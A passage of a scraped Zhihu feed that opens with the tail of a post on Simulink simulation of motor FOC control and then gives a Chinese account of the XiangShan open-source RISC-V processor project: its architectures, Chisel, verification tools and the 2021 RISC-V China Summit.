1e-4，相当于中断频率 10k，控制环路都放在中断里，就跟 MCU 的运行结构非常类似了。执行频率对于离散控制来说是核心参数，不同的执行频率仿真结果区别很大。</p>\n<p><strong>千万不要在 powergui 里设置成 continuous 仿真模式</strong>，那样会通过很高的计算频率掩盖环路的问题，用连续模式仿真成功基本等同于耍流氓！</p>\n<p>8、评估环路的阶跃响应：在伺服中比较常见的测试电流环带宽，一般测试交流给定幅相曲线。</p>\n<p>以阶跃响应为例，可以把电机角度固定成 0，电流解耦角度和逆变角度都强制给 0，然后电流环的 Id 给参考，测试 Id 环路的参考和反馈，即可得到阶跃响应。如下图:</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cc28e1f7022919c182fbf3403ddf0c28_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Id 电流环节约响应</figcaption></figure><p>9、评估参数敏感性：</p>\n<p>以磁链模型为例，当电机模型磁链跟计算使用磁链相等时，观测角度和误差如下：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-642b4016df77c692db968fd34caffceb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>计算磁链和电机模型磁链相等</figcaption></figure><p>当温度上升，磁链降低到只有计算值的 80%，再去比较估算角度和误差，就能判断控制方法对磁链的变化敏感程度。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-21cdc74eaaa240d4796e7238ac71e651_720w.jpg?source=8673f162\" alt=\"\"><figcaption>电机模型的磁链只有计算使用磁链的 80%</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-1af71038ac99847f93f9fda1048bc67f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>磁链下降 20%，观测角度误差增大到 15degrees</figcaption></figure><p>对于研究电机控制来说，前期的主要工作放在文献和仿真上，到了代码已经是很后期的工作了。这种工作并不是靠代码量来决定工作进展，也许研究了一个月就改了一行代码却能够解决大问题。</p>\n<p>对于我来说，如果不让我使用 simulink 我觉得自己就基本失业了，工作也没有任何乐趣可言。转电机并不是无脑的去写代码做实验，而是通过 simulink 去打磨模型，通过模型的搭建深入理解了方法才去开始实物阶段的实验。要想深入理解 FOC，使用 MATLAB 是必经之路，没有捷径可走。模型对电机的诠释是无法用实验来代替的。</p>\n<p>到现在为止，MATLAB 的功能也许我才用了不到 1‰。如果单纯能把 MATLAB 玩得很溜，我觉得年薪百万也不是难题。至少我的工作离不开 MATLAB。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/27850677\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737397"},{"title":"首届 RISC-V 中国峰会 2021 年 6 月 21 日起在上海举行，有什么值得关注的地方？","date":"2021-06-23 04:15:08","description":"\n<p>22号下午关于香山的报告，因为Zoom直播出现了技术故障，导致大家未能听到完整的报告，稍有些遗憾。考虑了一下，这里就把报告PPT直接贴出来，再加上我们在香山开发过程中的一些考虑和想法，跟大家分享。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8f4219b760442460fa7743602bb52bf6_720w.jpg?rss\" data-rawwidth=\"2035\" data-rawheight=\"1144\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8f4219b760442460fa7743602bb52bf6\" data-watermark-src=\"v2-0a4d567e9daf3c9851fcc39be43b39f1\" data-private-watermark-src=\"v2-37849addd056153ae64b11e462933d75\"></p>\n<p><b>这个报告主要回答四个问题：</b></p>\n<ul>\n<li>一、为什么要做香山？</li>\n<li>二、香山什么水平？</li>\n<li>三、香山怎么做的？</li>\n<li>四、香山未来如何发展？</li>\n</ul>\n<h2>一、为什么要做香山？</h2>\n<ol><li>2010年RISC-V诞生，迄今已有11年。如今，在RISC-V国际基金会网站上登记的各类商业或开源的RISC-V处理器核就有上百个（如下链接），<b>为什么还要做一个开源的高性能RISC-V核？</b>\n</li></ol>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//riscv.org/exchange/cores-socs/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">RISC-V Exchange: Cores &amp; SoCs - RISC-V International</a></p>\n<p>对于这个问题，我们和很多业界企业交流过，也做了很多调研与分析，这都让我们判断认为业界需要一个开源的高性能RISC-V核。另一方面，我们也在思考一个问题——<b>为什么CPU领域还没有一个像Linux那样的开源主线？1991年开源的Linux诞生，到今天正好30年</b>。如今，Linux不仅被工业界广泛应用，也成为学术界开展操作系统研究的创新平台。</p>\n<p>RISC-V是开放开源的指令集，<b>允许全世界任何人免费实现一个RISC-V处理器，可以是商用，也可以开源，这是和公司私有的X86/ARM指令集相比最大的区别之一</b>。但是，十年过去了，到现在还未能形成一个像Linux那样的开源主线。Berkeley的BOOM目标是一个高性能开源RISC-V核，但是BOOM代码仓库相对不开放，官方建议其他人实现任何功能都要事先和他们沟通，以确保不要与他们的计划产生冲突。根据GitHub官方的统计页面显示，<b>从2014年1月至今，为BOOM提交过超过100行代码修改的仅有8人</b>。由此可见，一定程度上因为BOOM严格的外部贡献政策，开源社区对BOOM的参与度并不高。</p>\n<p>所以，团队的唐丹博士和我一直认为要<b>建立一个像Linux那样的开源RISC-V核主线，既能被工业界广泛应用，又能支持学术界试验创新想法。最关键的是，一定要让它像Linux那样至少存活30年</b>！</p>\n<p>于是，“香山”诞生了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3a7f495574800afebdaa377394034847_720w.jpg?rss\" data-rawwidth=\"2040\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3a7f495574800afebdaa377394034847\" data-watermark-src=\"v2-c52687c3d5df75d5c99ab9f8f5a667b4\" data-private-watermark-src=\"v2-0efd422805882b36279d7d514ac92ca4\"></p>\n<p>2. <b>我们做了一年多的准备工作——申请经费，启动“一生一芯”计划培养人才，建立团队，寻找合作伙伴……这期间得到了太多太多人的支持和帮助：</b>计算所孙凝晖院士帮我们多处找经费，国科大全力支持“一生一芯”计划，鹏城实验室支持我们建立起后端物理设计团队，多位计算所老所友毅然决定参与开源主线等等，就不一一列举了。</p>\n<p>终于，香山正式启动了——<b>2020年6月11日，香山在GitHub上建立了代码仓库</b>。</p>\n<p>短短的的一年时间里，<b>25位同学和老师参与了香山的开发。821次主分支代码合并，3296次代码提交（commit），5万余行代码，400多个文档，记录了香山的成长过程</b>。我们的理念是<b>代码开源、流程开放、文档公开</b>。这期间，有企业直接参与开发，也有企业表达参与意向，都因为认同开源理念，愿意一起来共建开源的香山。这些来自工业界的积极反馈，给与我们极大的鼓舞和信心，<b>让我们更坚定地去践行“科研重工业模式”</b>。</p>\n<p>“科研重工业模式”，是 2020年1月我为《中国计算机学会通讯（CCCF）》写了一篇卷首语《<b>伯克利科研模式的启发</b>》中提出的：</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/268197755\" class=\"internal\">袁岚峰：CCCF卷首语 ：伯克利科研模式的启发 | 包云岗</a></p>\n<blockquote>回顾伯克利的科研历程，可以发现他们在过去几十年研制了大量的原型系统，不仅推动了技术进步甚至颠覆产业，也培养了一代代杰出人才（其中多位获得图灵奖）：1950年代CALDIC系统(Doug Englebart)，1960年代Project Genie系统(Butler Lampson与Chuck Thacker)，1970年代BSD Unix操作系统与INGRES数据库系统(Michael Stonebraker)，1980年代RISC处理器(David Patterson)，1990年代RAID存储系统与NOW机群系统……如果用一句话来<b>总结伯克利的科研模式</b>，那就是——<b>热衷于研制真正能改变现状的原型系统，哪怕需要大量工程投入</b>。国重主任孙凝晖院士称之为“<b>科研重工业模式</b>”。</blockquote>\n<p>“科研重工业模式”，我们不想纸上谈兵，我们要用行动去实践。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a511b0024ce4cb05c4d6b15754c04ea2_720w.jpg?rss\" data-rawwidth=\"2046\" data-rawheight=\"1152\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a511b0024ce4cb05c4d6b15754c04ea2\" data-watermark-src=\"v2-bec93682f39b8aab1a1584b3512604e2\" data-private-watermark-src=\"v2-513820de9a80756d0cc49135a1a38905\"></p>\n<h2>二、香山什么水平？</h2>\n<p>3. 香山是一款开源RISC-V处理器核，<b>它的架构代号以湖命名</b>。<b>第一版架构代号是“雁栖湖”</b>，这是带有浓重国科大情节的同学们起的名字，因为他们研一都在怀柔雁栖湖待了一年。“雁栖湖”RTL代码于2021年4月完成，计划于7月基于28nm工艺流片，目前频率为1.3GHz。</p>\n<p><b>第二版架构代号是“南湖”</b>，这是向建党100周年致敬。“南湖”计划在今年年底流片，将采用14nm工艺，目标频率是2GHz。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-44ffc47f05bf3a3cf52251577b7fc838_720w.jpg?rss\" data-rawwidth=\"2047\" data-rawheight=\"1152\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-44ffc47f05bf3a3cf52251577b7fc838\" data-watermark-src=\"v2-8cd4e5dc1378177392484ea68e250018\" data-private-watermark-src=\"v2-f5e120cfb9f3b45a9121ffb9e8bf0a49\"></p>\n<p>香山选择什么开源许可证？这个问题纠结了我们好一阵子。后来，我们专门向北京大学周明辉教授请教，小伙伴们制定了4种开源许可证方案。<b>在反复对比权衡后，最终选择了如下表格中的方案①——木兰宽松版许可证（MulanPSLv2）</b>。在此，特别感谢北大周明辉老师的专业指导！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5fb476460aa3485b667fb3281acfb34e_720w.jpg?rss\" data-rawwidth=\"1147\" data-rawheight=\"633\" data-size=\"normal\" data-caption=\"开源许可证方案对比（徐易难整理）\" data-watermark=\"watermark\" data-original-src=\"v2-5fb476460aa3485b667fb3281acfb34e\" data-watermark-src=\"v2-a3cfb3d7966e2aaa0cb8c1fc6201222c\" data-private-watermark-src=\"v2-752c7b238a13ffd788c289c43e06eca2\"></p>\n<p>4. “雁栖湖”架构是一个<b>11级流水、6发射、4个访存部件的乱序处理器核</b>。在发射宽度上已经可以和一些ARM高端处理器核相当，但还未进行充分优化，因此实际性能还有不小的差距。我们希望未来通过持续迭代优化（“南湖”--&gt;\"X湖\"--&gt;\"Y湖\"--&gt;……），<b>性能达到ARM A76的水平</b>。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ed07d7468848b12c5a126ece025b7922_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"1145\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ed07d7468848b12c5a126ece025b7922\" data-watermark-src=\"v2-79dce8b78719a8b35fcd0ff2747a156a\" data-private-watermark-src=\"v2-dac56bc271f0fc46d4542ede366333dc\"></p>\n<p>5. 我们<b>基于GitHub CI构建了一套流程化的自动回归测试框架</b>，并在过去大半年不断增加测试负载，从cputest，risc-tests到Linux，到SPECCPU workload。这套自动回归测试框架在保障和验证芯片的正确性。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-978adaf22f9bc3b9084863d3b6a599dd_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"1157\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-978adaf22f9bc3b9084863d3b6a599dd\" data-watermark-src=\"v2-f3ab1bc6f814a5451bca1a14e6ebd1c8\" data-private-watermark-src=\"v2-927bb1e524c27c5b967a4e7d5bdad8c8\"></p>\n<p>每个大项目总会有一些激动人心的时刻，这段30秒的小视频记录了香山在FPGA上启动Linux/Debian的时刻，略带喜感。</p>\n<a href=\"https://www.zhihu.com/zvideo/1390842319982120960\">香山在FPGA上启动Linux/Debian</a><h2>三、香山怎么做的？</h2>\n<p>6. 香山开发初期速度非常快：<b>6月11日建立代码仓库，7月6日乱序流水线便已完成，能正确运行CoreMark，不到一个月时间；9月12日，Linux正确启动；10月22日，Debian正确启动</b>。</p>\n<p>接下来便是大半年的结构优化、性能调优、时序优化工作，<b>香山架构几乎相当于重构了一遍</b>。一个典型的例子，香山的第一版分支预测器（BPU）参考了BOOM的BPU，但后端评估频率只能达到800MHz（28nm）。于是负责BPU设计的勾凌睿在几位老师的指导下，不断优化BPU结构，最终将频率提升到了1.4GHz。</p>\n<p>这期间，小伙伴们纷纷自己动手，<b>开发了各种各样的优化和调试工具，大大地加速了优化和验证环节</b>。这让我真心佩服这批90后——他们真是<b>充满了创造力，从工作到生活，而主要驱动力之一就是“省（tou）时（lan）”</b>。比如宁可自己写个程序自动点外卖，也懒得打开手机看菜单点。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e798f0abbb38efa99a9765524da59021_720w.jpg?rss\" data-rawwidth=\"2045\" data-rawheight=\"1152\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e798f0abbb38efa99a9765524da59021\" data-watermark-src=\"v2-ec59fc3a633b4fa91b01f4f9e44c21b7\" data-private-watermark-src=\"v2-3aa44b783e677eb869af89d98f034dbf\"></p>\n<p>7. 香山的开发至少有两个重要的决策，<b>第一个便是选择敏捷设计语言Chisel</b>。很多人质疑Chisel，排斥Chisel，但是我们在充分评估后，还是决定使用Chisel。</p>\n<p>我们团队是在2016年开始使用Chisel，一开始组里也充满质疑。2018年，我们设计了两组定量的对比实验，找了2位同学用Chisel、1位工程师用Verilog分别设计一个L2 Cache模块。通过一系列量化对比，得出了如下三个结论：</p>\n<ol>\n<li>\n<b>Chisel开发效率远高于Verilog</b>；</li>\n<li>\n<b>实现相同的功能，Chisel代码量仅为Verilog的1/5</b>（因此香山的5万行Chisel代码相当于25万行Verilog代码）；</li>\n<li>\n<b>Chisel的开发质量不比Verilog差</b>。</li>\n</ol>\n<p>后来将实验结果发表在2019年1月的《计算机研究与发展》。最近去华为交流，才知道这些<b>对比结果也推动了华为内部组建了Chisel开发团队，如今华为也是Chisel的支持者</b>。</p>\n<p>2020年，我们又<b>基于Chisel完成了一款8核标签化RISC-V处理器的流片</b>，这是基于Rocket处理器核进行了标签化体系结构改造，采用28nm工艺流片。虽然因为时间紧张，并没有进行细致的后端优化，但芯片返回后也还能正常运行在1.2GHz。这是一颗有一定复杂度的8核SoC芯片，但Chisel能应对。所以，<b>我们相信Chisel可用来开发复杂芯片</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5f2ae6a85f722d5e3366013ec03ae753_720w.jpg?rss\" data-rawwidth=\"2045\" data-rawheight=\"1160\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5f2ae6a85f722d5e3366013ec03ae753\" data-watermark-src=\"v2-d8a370507e3af42c53a7e4a804cd18a2\" data-private-watermark-src=\"v2-4c6fdf6695a2a5878414ec24eeba803d\"></p>\n<p>8. 在开发香山的过程中，<b>我们团队积累了丰富Chisel开发经验</b>。小伙伴们（徐易难、王凯帆、蔺嘉炜、余子濠、金越）准备了6个报告，将会在6月25日的CCC Workshop上和大家分享。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2d397ff60a8557b49d489440a17789a8_720w.jpg?rss\" data-rawwidth=\"2050\" data-rawheight=\"1159\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2d397ff60a8557b49d489440a17789a8\" data-watermark-src=\"v2-79ca8fb1ea50f57c6407ba9b1745893b\" data-private-watermark-src=\"v2-f4305cdafd1fe2b5363e779be6941bad\"></p>\n<p>9. 另一个重要决策就是<b>高度重视构建支持敏捷设计的流程与工具</b>。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d7ba7b1ee3c03c3d330c673c3c77e538_720w.jpg?rss\" data-rawwidth=\"2051\" data-rawheight=\"1153\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d7ba7b1ee3c03c3d330c673c3c77e538\" data-watermark-src=\"v2-2659375772c110108238f6ccea20dca5\" data-private-watermark-src=\"v2-aedb701aa403bfd1fb31d137faba01cc\"></p>\n<p>我们在开发香山的过程中，<b>一直在强调流程、平台、基础设施的重要性</b>。我更多是扮演了啦啦队队长的角色，而小伙伴们则真正将理念落实到了具体行动。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-02c89c0be6d728e2c0be8873b6894e36_720w.jpg?rss\" data-rawwidth=\"713\" data-rawheight=\"916\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-02c89c0be6d728e2c0be8873b6894e36\" data-watermark-src=\"v2-eefe816e98f6557494a91bde531e2cb1\" data-private-watermark-src=\"v2-df90cc6a088502c5fe272fc5e29d7c04\"></p>\n<p>10. 为了更好地支持Chisel开发与调试，为了更快地捕捉、复现和定位bug，为了更准确地评估优化技术的性能收益，<b>小伙伴们开发十余种各具特色的工具。这些工具支撑起了一套处理器芯片敏捷开发的流程</b>。当然，这套流程还比较初级，尚不系统化。我们也期待更多的开源开发者加入，一起完善这套敏捷设计流程。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b5f9d782da03cdab896d5ebda0b1fcb7_720w.jpg?rss\" data-rawwidth=\"2053\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b5f9d782da03cdab896d5ebda0b1fcb7\" data-watermark-src=\"v2-e99302b14413b66ed10864e73158e8b5\" data-private-watermark-src=\"v2-e306425f8f508f4aef81074afe3d964b\"></p>\n<p>11. 下面举几个工具的例子。NEMU是由余子濠在南大本科时便开始开发的一款教学模拟器。在计算所读博期间，他凭借一人之力一直在持续改进和优化NEMU，使<b>NEMU成为一个效率接近QEMU的高性能解释器——启动Debian甚至比QEMU还要快18.2%</b>（9.87s vs. 12.07s）。</p>\n<p>更重要的是NEMU是指令解释器，<b>可以针对每一条指令进行动态分析</b>；相比而言，QEMU的翻译粒度是基本块，无法跟踪每一条指令。事实上，NEMU的这种指令解释器机制，成为了香山开发中正确性验证框架Difftest的基础。（余子濠将会在6月23日下午介绍NEMU）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b53034310c68487d9d3595083c02668a_720w.jpg?rss\" data-rawwidth=\"2054\" data-rawheight=\"1157\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b53034310c68487d9d3595083c02668a\" data-watermark-src=\"v2-493d0a0c9ddeca048251768c2068e534\" data-private-watermark-src=\"v2-5e4de996f012afc2d6f11eb2c2745ae0\"></p>\n<p>12. Cache是处理器中非常核心的模块，尤其是要支持一致性协议的Cache更为复杂。为此，小伙伴们<b>开发了一套专门验证支持TileLink一致性协议的Cache模块测试框架Agent Faker</b>，发现了好几个Cache模块的bug。（张传奇将会在6月25日上午介绍这个工作）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ca67a73de8769c982c718ec755c34e2d_720w.jpg?rss\" data-rawwidth=\"2050\" data-rawheight=\"1158\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ca67a73de8769c982c718ec755c34e2d\" data-watermark-src=\"v2-e4fddc41025bd2cb6ecef9cfbc5ed778\" data-private-watermark-src=\"v2-bc7eae5544e980b94efd2c645cdf4a88\"></p>\n<p>13. Difftest是一个基于NEMU的指令集在线差分验证框架。它的一端是模拟器，提供处理器执行的黄金标准；另一端是运行RTL的仿真器，在仿真过程中会将指令数、中断、MMIO、微结构状态等信息发送给NEMU进行比对，从而判断RTL实现的正确性。</p>\n<p>Difftest最早是由余子濠实现，后来王凯帆进行优化，<b>其中一个最重要的改进就是SMP-Difftest，支持多核SMP的全系统仿真，并且支持Cache一致性、内存一致性等需要软硬件协同的问题</b>。（王凯帆将会在6月24日下午介绍Difftest）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cc6bf5873d1fd09c1ecc61f427494240_720w.jpg?rss\" data-rawwidth=\"2052\" data-rawheight=\"1161\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cc6bf5873d1fd09c1ecc61f427494240\" data-watermark-src=\"v2-b465709f917a39b99b40add9318a440a\" data-private-watermark-src=\"v2-80f2b672aacd3b9f1daadf98cf0cee40\"></p>\n<p>14. 如何快速捕捉、复现、定位bug是调试过程中非常关键的步骤，很多时间都是消耗在这个阶段。小伙伴们提出了<b>一种创新的轻量级仿真快照技术——把整个仿真程序看成是一个进程，利用fork机制创建子进程</b>。然后父进程继续执行，子进程暂停。当父进程出错时，则可以恢复到子进程进行调试。 LightSSS这个机制和Verilator仿真器自带的Savable机制相比，<b>单次快照时间缩短了近7000倍！</b>（余子濠将会在6月23日下午介绍LightSSS）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d06151ab7fdc64c000d348ddef83c940_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"1156\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d06151ab7fdc64c000d348ddef83c940\" data-watermark-src=\"v2-92cb4d30fea4ad3b9753de8c8472ef4e\" data-private-watermark-src=\"v2-6aa72886784ef4a4b800b816160c5e06\"></p>\n<p>15. 很多人质疑Chisel不方便调试。小伙伴们则充分<b>利用了Chisel的可以自定义Firrtl Transform的特点，设计了一套新型的硬件敏捷调试栈，可将基于波形的调试转换为基于事件的调试</b>。我们设计了一套工具，可以直接将高层语义新型从波形中提取出来，并进行可视化。为此，还专门设计了一个Xiang语言。（蔺嘉炜将在6月23日下午介绍该工作）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-30de046418f5d22ee635b92e35642145_720w.jpg?rss\" data-rawwidth=\"2052\" data-rawheight=\"1155\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-30de046418f5d22ee635b92e35642145\" data-watermark-src=\"v2-e3a37d7478d855f441c7d6c0e8b47a29\" data-private-watermark-src=\"v2-9235bb2c97526db9d5156cc8943b7a7d\"></p>\n<p>16. 处理器性能优化环节最关键是要快速准确地评估优化技术带来地性能收益。如果评估过程需要几天时间，那将会严重影响迭代优化效率。小伙伴们<b>设计了一个敏捷性能评估框架BetaPoint，它利用了三个机制——Sampling机制、Generic Full System Checkpoint机制和Functional Warmup机制，实现了可以在10个小时内估算出处理器地SPEC分数</b>。（周耀阳将会在6月23日傍晚介绍BetaPoint）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fa4dbb9e42f40e4482a2a4811a09d0b1_720w.jpg?rss\" data-rawwidth=\"2052\" data-rawheight=\"1159\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fa4dbb9e42f40e4482a2a4811a09d0b1\" data-watermark-src=\"v2-1247f5f2b72bb0c2e61cbf704336313f\" data-private-watermark-src=\"v2-0edb35c8e9cf480ed1058c99ec1e948b\"></p>\n<p>17. 整个香山开发团队将在这次峰会上和大家分享22个技术报告。这些报告都是清一色的90后，很多都是95后：<b>勾凌睿、胡博涵、金越、李昕、刘志刚、蔺嘉炜、王华强、王诲喆、王凯帆、徐易难、余子濠、张传奇、张发旺、张林隽、张紫飞、张梓悦、周耀阳、周意可、邹江瑞</b>；此外还有多位参与香山开发的同学这次并没有投稿。这些小伙伴们在香山的开发过程中做出了不可替代的贡献。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b614f2e01b863c5cfb908fa1a1f9aa51_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1157\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b614f2e01b863c5cfb908fa1a1f9aa51\" data-watermark-src=\"v2-0945f698ffceb06040095f652e694df8\" data-private-watermark-src=\"v2-d96852c6d919197dfc95f97278d458db\"></p>\n<h2>四、香山未来如何发展？</h2>\n<p>18. 目前香山正在进行下一代架构“南湖”的开发，目标是今年年底流片，<b>基于14nm工艺频率达到2GHz，SPECCPU分值达到10分/GHz</b>。这是一个很有挑战的目标，需要对架构进行大幅度的优化改进。</p>\n<p>前几天，小伙伴们专门去了一趟嘉兴南湖，研讨香山未来的发展。除了技术，我们再一次聚焦到流程与平台。此前构建的敏捷设计流程与平台支撑了20多人的开发团队，这远远不够。现在我们需要考虑的是该<b>如何构建一套开源、开放、规范的开放流程，能支撑2000人的开源社区一起开发</b>。</p>\n<p>支持成千上万人一起开发开源软件，这已经有成功的经验。但是<b>如何支持数千人一起开发开源处理器，目前还没有可以参考的案例，只能靠我们自己摸索。也期待各界专家给我们更多的指导和建议。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8ea1302a036d8ffc732aa1c226f339b8_720w.jpg?rss\" data-rawwidth=\"2051\" data-rawheight=\"1155\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8ea1302a036d8ffc732aa1c226f339b8\" data-watermark-src=\"v2-793b94f8b0eec7f907f21f1d562bd5e3\" data-private-watermark-src=\"v2-8023bd1252eaa4120eb401c8f6a07ec5\"></p>\n<p>19. <b>我们有一个愿望——希望“香山”能存活30年；我们有一个约定——30年后再一起聚聚</b>，到时再看看香山会变成什么样。但是，要实现这个愿望，还有很多很多问题和挑战需要去解决。</p>\n<p>真诚地期待有更多伙伴加入香山的开发队伍！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b1603a84ecc4c42c91f0f33188c7fa7a_720w.jpg?rss\" data-rawwidth=\"2051\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b1603a84ecc4c42c91f0f33188c7fa7a\" data-watermark-src=\"v2-b96af9593681a914c73717477e1c6622\" data-private-watermark-src=\"v2-8a4397fa9b3223b2cd08eac29241c0de\"></p>\n<p>20. 香山是在<b>中科院计算所、鹏城实验室</b>的支持下，通过<b>中国开放指令生态（RISC-V）联盟</b>联合业界企业一起开发一款开源高性能RISC-V处理器核，也得到了<b>北京智源人工智能研究院</b>的支持。在此，要特别感谢<b>北京微核芯公司</b>的资深专家给予香山的开发强力的支持，他们非常认同开源理念，也是第一家与香山联合开发的企业。很高兴“南湖”架构的开发有了更多的合作伙伴，感谢对香山的支持。</p>\n<p>欢迎联系我们一起加入香山开源社区！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-59071133192692ae413604a2189e9489_720w.jpg?rss\" data-rawwidth=\"2047\" data-rawheight=\"1149\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-59071133192692ae413604a2189e9489\" data-watermark-src=\"v2-1ef4361d4c6191fc9ecb2e7cb82d4685\" data-private-watermark-src=\"v2-31afb68c844fef52a6cc59dd44865ca5\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-10552de2ba59e00f774123321f8b8f23_720w.jpg?rss\" data-rawwidth=\"4000\" data-rawheight=\"3000\" data-size=\"normal\" data-caption=\"香山团队部分成员在RISC-V中国峰会合影\" data-watermark=\"watermark\" data-original-src=\"v2-10552de2ba59e00f774123321f8b8f23\" data-watermark-src=\"v2-684fec7a3eaec7c13c325d6088f2e456\" data-private-watermark-src=\"v2-710c2dc279c00086328792dff2c65cd7\"></p>\n<h2>五、花絮</h2>\n<ul>\n<li>\n<b>一本关于香山的书</b>。很多人觉得CPU设计很难，很高大上，我们倒是希望能把这个门槛给降一降——所以打算出一本类似伯克利的《TCP/IP协议栈详解》和毛德操老师的《Linux内核源代码场景分析》那样的书，结合香山的源代码来分析CPU设计细节和诀窍（know-how）。这本书也可以用开源的方式由社区一起撰写，欢迎感兴趣的朋友一起参加。</li>\n<li>\n<b>“一生一芯”计划的回报</b>。首期“一生一芯”计划的五位同学（金越、王华强、王凯帆、张林隽、张紫飞）在本科一毕业便加入了香山的开发，成为了技术骨干。很多人都问他们什么时候毕业，可能需要再等等了。他们现在才研一，还要再等两年才会有同学毕业。</li>\n<li>\n<b>疫情中的封闭开发</b>。2020年6月初，北京新发地忽然出现了新冠疫情，导致同学们都无法回到北京。感谢深圳鹏城实验室的大力支持，整个团队全部集中到深圳，在鹏城实验室集中了三个月的封闭开发。那段时间基本上每周都有超过150个commit，反而成为开发效率最高的一个时间段。</li>\n<li>\n<b>香山的Logo</b>。我们尝试了很多个香山logo设计，最后经过大家投票选择了左下角的那个方案。不过有朋友好心告知香山的红叶主要是黄栌叶。好在香山也有五角枫，暂时就先定这个logo了。</li>\n</ul>\n<p><img src=\"https://pic2.zhimg.com/v2-b97c4c1e14d0e0cbcf9c894db122f3b0_720w.jpg?rss\" data-rawwidth=\"1972\" data-rawheight=\"968\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b97c4c1e14d0e0cbcf9c894db122f3b0\" data-watermark-src=\"v2-cf5f97f3924692117d5b4d690b8627b7\" data-private-watermark-src=\"v2-9f9e8e814fca2579b930d2ada4c89896\"></p>\n<hr>\n<h2>最后几句</h2>\n<p>有幸和阿里巴巴的戚总（戚肖宁）一起担任首届RISC-V中国峰会的联席大会主席，但其实幕后是中科院软件所和上海科技大学的老师们为这次峰会的筹备和保障工作付出了巨大的努力。</p>\n<p>由于疫情带来极大的不确定性，组委会始终保持高度紧张状态：一开始只开放了大约1500位线下参会名额，但很快就报满了；后来又开放了两次补报机会，但每次也只开放了200个名额，最后一共是2600人次（有的同时报名参加主会和分会）。</p>\n<p>但即使如此，最后因为广东那边的疫情原因，不得不安排大家远程参会。在此，对未能报上名的朋友说声抱歉，对报上名但因为疫情而选择放弃现场参会的朋友道声感谢。不过这次峰会提供了4个直播渠道，全程直播101个报告，并在后续会有视频回放。很抱歉直播中间也遇到了一些技术问题（有些上午调试好了下午还出错），在此再说声抱歉。</p>\n<p>特别感谢中科院软件所的吴伟老师和武延军老师，他们为筹备这次峰会而殚精竭虑，真的付出太多了。感谢上海科技大学信息学院周平强院长，协调上海本地各方资源，全力支持和保障峰会的顺利召开。也要感谢所有为峰会默默付出的筹备组成员和志愿者们！</p>\n<p>大家因RISC-V而汇聚到一起，正是因为RISC-V所带来的开源、开放、共享、共治是大家的共识，也是因为RISC-V为我们带来了无限的想象